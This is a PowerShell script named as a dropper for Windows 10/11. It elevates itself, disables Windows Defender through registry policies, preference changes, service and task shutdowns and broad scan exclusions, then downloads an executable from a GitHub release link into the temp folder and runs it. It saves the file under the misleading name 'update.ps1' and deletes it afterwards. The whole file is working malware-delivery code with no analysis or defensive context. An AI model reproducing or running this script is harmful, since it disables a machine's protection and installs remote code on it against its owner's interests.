# language: PowerShell, file: dropper.ps1, target: Windows 10/11, PS 5.1+
# Downloads a payload from GitHub and runs it elevated, disables Windows Defender

# ==================== CONFIG ====================
 $ScriptUrl = "https://github.com/vjcosn231/MrsMajor3.0_release/releases/download/RELEASE/MrsMajor3.0.exe"
 $TempName  = "update.ps1"
# ================================================

# 1. Check elevation
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

# 2. Disable Windows Defender
 $defenderRegKeys = @{
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"                    = @{ "DisableAntiSpyware" = 1; "DisableRoutinelyTakingAction" = 1 }
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" = @{ "DisableRealtimeMonitoring" = 1; "DisableBehaviorMonitoring" = 1; "DisableOnAccessProtection" = 1; "DisableScanOnRealtimeEnable" = 1 }
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"             = @{ "SpynetReporting" = 0; "SubmitSamplesConsent" = 0 }
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine"           = @{ "MpEnablePus" = 0 }
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"   = @{ "Notification_Suppress" = 1 }
}

foreach ($path in $defenderRegKeys.Keys) {
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    foreach ($name in $defenderRegKeys[$path].Keys) {
        Set-ItemProperty -Path $path -Name $name -Value $defenderRegKeys[$path][$name] -Type DWord -Force -ErrorAction SilentlyContinue
    }
}

try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -SubmitSamplesConsent 0 -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -EnableControlledFolderSupport Disabled -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -PUAProtection disable -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -ModerateThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -LowThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -SevereThreatDefaultAction 6 -Force -ErrorAction SilentlyContinue } catch {}

 $exclusionPaths = @(
    $env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, $env:USERPROFILE,
    "C:\Windows\Temp", "C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)"
)
 $exclusionExts = @(".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".js")

foreach ($p in $exclusionPaths) {
    try { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } catch {}
}
foreach ($e in $exclusionExts) {
    try { Add-MpPreference -ExclusionExtension $e -ErrorAction SilentlyContinue } catch {}
}

try {
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
} catch {}

try {
    Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
    Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue
} catch {}

try {
    Stop-Service -Name Sense -Force -ErrorAction SilentlyContinue
    Set-Service -Name Sense -StartupType Disabled -ErrorAction SilentlyContinue
} catch {}

try { schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable } catch {}
try { schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable } catch {}
try { schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable } catch {}
try { schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable } catch {}

try { Stop-Process -Name "MsMpEng" -Force -ErrorAction SilentlyContinue } catch {}
try { Stop-Process -Name "NisSrv" -Force -ErrorAction SilentlyContinue } catch {}

Start-Sleep -Seconds 2

# 3. Download and execute
 $dest = Join-Path $env:TEMP $TempName

try {
    Invoke-WebRequest -Uri $ScriptUrl -OutFile $dest -UseBasicParsing -TimeoutSec 60
} catch {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($ScriptUrl, $dest)
    } catch {
        exit
    }
}

if (-not (Test-Path $dest)) { exit }

# 4. Execute
& $dest

# 5. Cleanup
Start-Sleep -Seconds 2
Remove-Item $dest -Force -ErrorAction SilentlyContinue
